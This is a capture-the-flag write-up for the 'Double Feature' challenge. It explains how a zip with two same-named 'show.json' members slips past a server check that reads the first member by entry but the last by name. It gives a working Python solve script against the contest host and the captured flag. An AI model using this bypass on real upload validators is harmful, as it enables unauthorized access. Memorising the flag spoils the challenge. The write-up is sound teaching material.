---
title: "Double Feature"
ctf: "Safaricom CTF"
date: 2026-10-06
category: misc
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Double Feature

> **Category:** MISC · **Points:** 300 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Target:** http://54.72.82.22:8640 (Werkzeug / Python — the shared family runtime, kind `misc-zip`)

## Surface

| Route | Behaviour |
| --- | --- |
| `GET /` | desk page ("Double Feature" / "Two screens, one very good evening.") linking `/downloads/sample.zip` |
| `GET /downloads/sample.zip` | 152 B zip holding exactly one file: `show.json` = `{"mode": "preview", "stage": "foyer"}` |
| `POST /api/import` | `{"bundle": "<base64 zip>"}` — the graded endpoint |
| `GET /health` | `{"status":"ok"}` |

`GET /api/import` and `POST /api/import {}` both return
`{"message":"Request unavailable."}` — **400 from the dispatcher's exception
handler**, not the `{"message":"Not found"}` 404 of an unknown op. That is the
tell that the `import` op exists and only the missing `bundle` key raised.

## The bug (duplicate zip members)

Server logic (identical to `kind=='misc-zip'` in the leaked organizer runtime,
`chal/_shared/organizer-service.py`):

```python
raw = base64.b64decode(d['bundle']); z = zipfile.ZipFile(io.BytesIO(raw))
entries = z.infolist()
if len(entries) > 12:                          return reject
first = next(x for x in entries if x.filename == 'show.json')
if json.loads(z.read(first))['mode'] != 'preview':   return reject
last  = json.loads(z.read('show.json'))
return ok if last['mode'] == 'publish' and last['stage'] == 'main'
```

The two reads resolve **different entries**:

- `z.read(first)` is handed a `ZipInfo`, so it reads *that exact member*;
- `z.read('show.json')` is handed a **name**, and `NameToInfo` maps a name to the
  **last** member that used it.

A zip may legally carry duplicate filenames. So a two-member archive passes both
guards with contradictory contents:

```
entry 1  show.json  {"mode":"preview","stage":"foyer"}   -> first gate
entry 2  show.json  {"mode":"publish","stage":"main"}    -> final gate
```

## Reproduce

```
/home/nomad/safaricom_ctf/.venv/bin/python solve.py
```

→ `200 {"message":"safctf{513195eb399c59321e043c54773185b7}","ok":true}`

## Notes

- This identifies the previously *unmapped* `misc-zip` kind: it is **Double
  Feature :8640**. (The other unmapped kind, `api-canonical`, is still unplaced.)
- `zipfile` emits a `UserWarning: Duplicate name` when writing the bundle —
  harmless; the server reads it back without complaint.
- The desk app's `/submit` is a decoy here: the flag comes from `/api/import`,
  consistent with the sibling `misc-machine` (Ticket Carousel) and
  `crypto-oracle` (Midnight Parcel) kinds which also grade on their own op.

## Solve script

`misc/double-feature/solve.py`:

```python
#!/usr/bin/env python3
"""Double Feature (8640) -- misc-zip kind of the shared family runtime.

The desk app serves /downloads/sample.zip containing a single `show.json`
({"mode":"preview","stage":"foyer"}) and exposes:

    POST /api/import  {"bundle": "<base64 zip>"}

whose server logic (see chal/_shared/organizer-service.py, kind `misc-zip`) is:

    entries = z.infolist()
    if len(entries) > 12:            reject
    first = next(x for x in entries if x.filename == 'show.json')
    if json.loads(z.read(first))['mode'] != 'preview':   reject
    last = json.loads(z.read('show.json'))
    return ok if last['mode'] == 'publish' and last['stage'] == 'main'

A zip may legally carry DUPLICATE filenames. `z.read()` given a ZipInfo reads
that exact entry, but given the *name* it resolves to the LAST entry with that
name. So two `show.json` entries satisfy both checks with contradictory content:

    entry 1  {"mode":"preview","stage":"foyer"}    -> passes the first gate
    entry 2  {"mode":"publish","stage":"main"}     -> passes the final gate

Run:  /home/nomad/safaricom_ctf/.venv/bin/python solve.py
"""
import base64
import io
import json
import zipfile

import requests

BASE = "http://54.72.82.22:8640"


def build_bundle():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("show.json", json.dumps({"mode": "preview", "stage": "foyer"}))
        z.writestr("show.json", json.dumps({"mode": "publish", "stage": "main"}))
    return buf.getvalue()


def main():
    raw = build_bundle()
    z = zipfile.ZipFile(io.BytesIO(raw))
    first = next(x for x in z.infolist() if x.filename == "show.json")
    assert json.loads(z.read(first))["mode"] == "preview"          # first gate
    assert json.loads(z.read("show.json"))["mode"] == "publish"    # final gate

    r = requests.post(BASE + "/api/import",
                      json={"bundle": base64.b64encode(raw).decode()}, timeout=20)
    print(r.status_code, r.text)
    print("flag:", r.json()["message"])


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- `base64`
- `zipfile`
- Python `requests` (HTTP client)
- Python 3 (solver)

**Other tools that fit this category:**

- CyberChef (encoding chains)
- z3 / SageMath (constraints)
- pwntools (interaction)
- Ciphey (auto-decode)

## Flag

```
safctf{513195eb399c59321e043c54773185b7}
```
